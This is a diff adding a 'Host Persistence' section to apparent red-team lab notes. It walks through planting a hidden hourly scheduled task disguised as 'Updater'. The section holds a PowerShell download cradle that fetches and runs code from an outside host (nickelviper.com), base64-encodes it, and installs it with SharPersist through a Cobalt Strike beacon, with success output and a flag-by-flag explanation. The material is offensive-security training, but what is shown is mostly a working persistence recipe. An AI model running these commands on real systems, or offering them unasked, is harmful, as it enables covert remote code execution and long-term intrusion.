@@ -474,3 +474,38 @@ DEV\bfarmer
 DEV\jking
 DEV\WKSTN-2$
 ```
+
+
+
+# Host Persistence
+### Task Scheduler
+- create a scheduled task that will execute a PowerShell payload once every hour
+```
+In PowerShell:
+PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
+PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
+
+In Linux:
+ubuntu@DESKTOP-3BSK7NO ~> set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
+ubuntu@DESKTOP-3BSK7NO ~> echo -en $str | iconv -t UTF-16LE | base64 -w 0
+SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
+```
+```
+Create a new Scheduler:
+beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly
+
+[*] INFO: Adding scheduled task persistence
+[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
+[*] INFO: Scheduled Task Name: Updater
+[*] INFO: Option: hourly
+[+] SUCCESS: Scheduled task added
+```
+where:
+- -t is the desired persistence technique.
+- -c is the command to execute.
+- -a are any arguments for that command.
+- -n is the name of the task.
+- -m is to add the task (you can also remove, check and list).
+- -o is the task frequency.
